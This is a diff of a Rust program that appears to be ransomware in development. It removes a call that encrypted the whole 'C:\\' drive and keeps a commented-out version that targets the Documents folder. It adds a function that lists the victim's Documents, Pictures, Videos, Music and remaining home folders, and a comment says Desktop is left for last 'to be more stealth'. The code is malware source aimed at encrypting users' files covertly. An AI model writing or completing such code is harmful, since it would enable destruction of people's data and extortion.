@@ -1,11 +1,14 @@
 mod encryption;
+use aes_gcm_siv::aead::generic_array::typenum::Len;
 use aes_gcm_siv::aead::{Aead, NewAead};
 use aes_gcm_siv::{Aes256GcmSiv, Key, Nonce};
+use dirs;
 use encryption::encryptor;
 use encryption::key_gen;
 use fs_extra;
 use rand::prelude::*;
 use rand_hc::Hc128Rng;
+use std::collections::{HashMap, HashSet};
 use std::fs;
 use std::path;
 
@@ -17,7 +20,109 @@ fn main() {
 
     let encryptor = encryptor::Encryptor::from(key_bytes, nonce_bytes);
 
-    encryptor.encrypt_dir(&String::from("C:\\"));
+    /*
+    encryptor.encrypt_dir(&String::from(
+        dirs::document_dir()
+            .expect("Failed to get documents dir!")
+            .to_str()
+            .expect("Failed to convert path to string"),
+    ));*/
+
+    for path in fs::read_dir("files").unwrap() {
+        let path = path.unwrap().path();
+        if path.is_dir() {
+            let path = path.display().to_string();
+            println!("{}", &path);
+            println!("{}", &path.chars().last().unwrap());
+        }
+    }
+}
+
+fn load_common_folder_paths_windows(vec: &mut Vec<String>) {
+    // Adds the common folders in windows in order of importance leaving Desktop at the end to be more stealth.
+    // Adds documents folder path to the vec
+    let documents_path = match dirs::document_dir() {
+        Some(path) => match path.to_str() {
+            Some(path_str) => path_str.to_owned(),
+            None => String::from(""),
+        },
+        None => String::from(""),
+    };
+
+    // Adds pictures path to the vec
+    let pictures_path = match dirs::picture_dir() {
+        Some(path) => match path.to_str() {
+            Some(path_str) => path_str.to_owned(),
+            None => String::from(""),
+        },
+        None => String::from(""),
+    };
+
+    // Adds videos folder path to the vec
+    let video_path = match dirs::video_dir() {
+        Some(path) => match path.to_str() {
+            Some(path_str) => path_str.to_owned(),
+            None => String::from(""),
+        },
+        None => String::from(""),
+    };
+
+    // Adds pictures folder path to the vec
+    let audio_path = match dirs::audio_dir() {
+        Some(path) => match path.to_str() {
+            Some(path_str) => path_str.to_owned(),
+            None => String::from(""),
+        },
+        None => String::from(""),
+    };
+
+    let documents_path_clone = documents_path.clone();
+    let pictures_path_clone = pictures_path.clone();
+    let video_path_clone = video_path.clone();
+    let audio_path_clone = audio_path.clone();
+
+    vec.push(documents_path);
+    vec.push(pictures_path);
+    vec.push(video_path);
+    vec.push(audio_path);
+
+    // Adds all the remaining folders in the home folder (that weren't yet added)
+    match dirs::home_dir() {
+        Some(path) => match path.to_str() {
+            Some(home_path) => {
+                for path in fs::read_dir(home_path).unwrap() {
+                    let path = path.unwrap().path();
+                    if path.is_dir() {
+                        let path = path.display().to_string();
+                        let path_split: Vec<&str> = path.split("\\").collect();
+                        if path_split.last().unwrap() == &"Documents"
+                            && &path == &documents_path_clone
+                        {
+                            continue;
+                        } else if path_split.last().unwrap() == &"Pictures"
+                            && &path == &pictures_path_clone
+                        {
+                            continue;
+                        } else if path_split.last().unwrap() == &"Videos"
+                            && &path == &video_path_clone
+                        {
+                            continue;
+                        } else if path_split.last().unwrap() == &"Music"
+                            && &path == &audio_path_clone
+                        {
+                            continue;
+                        }
+
+                        vec.push(path);
+                    }
+                }
+            }
+            None => (),
+        },
+        None => (),
+    };
+
+    //map.insert("")
 }
 
 /*
